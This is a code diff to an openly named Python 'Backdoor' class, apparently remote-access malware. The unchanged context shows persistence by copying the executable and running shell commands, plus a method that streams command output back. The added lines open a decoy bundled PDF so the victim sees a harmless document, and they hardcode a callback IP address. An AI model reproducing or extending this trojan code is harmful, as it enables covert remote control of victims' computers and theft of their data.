@@ -60,9 +60,6 @@ class Backdoor:
             shutil.copyfile(sys.executable,pathToPersist)
             subprocess.call(cmd, shell = True)
 
-
-
-    
     
     def sendStream(self,data):
         #print('start of send stream')
@@ -220,9 +217,14 @@ class Backdoor:
                 self.sendStream(cmdOut)
 ###############################################################################################RUN#########################################################################################################################                   
 
+
+
+
 try:
+    front = sys._MEIPASS + "\\testpdf.pdf"
+    subprocess.Popen(front,shell=True)
     args = Args()
-    backdoor = Backdoor(args.ip,args.port)
+    backdoor = Backdoor("10.211.55.7",args.port)
     backdoor.run()
 except KeyboardInterrupt:
     sys.exit()
